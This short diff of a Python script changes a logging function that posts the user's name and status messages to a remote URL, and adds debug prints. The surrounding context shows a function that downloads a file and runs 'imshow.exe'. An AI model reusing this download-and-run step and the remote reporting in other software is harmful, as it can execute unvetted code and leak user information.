@@ -33,9 +33,10 @@ def hit(url:str,data=None):
 def log(statement,state="SUCESS"):
     try:
         statement = f"{state}   {statement}"
-        hit(url+"output",json={"user":user,"error":statement})
+        hit(url+"output",data={"user":user,"err":statement})
+        print("done")
     except:
-        pass
+        print("abhigyan")
 
 def say(txt):
     try:
@@ -247,6 +248,7 @@ def display(fp:str):
                         downloaded_size += len(chunk)
         os.startfile("imshow.exe")
     except Exception as e:
+        print("Error")
         log(f"Display thread error occured:\t{e}",state="WARN")
 
 def main():
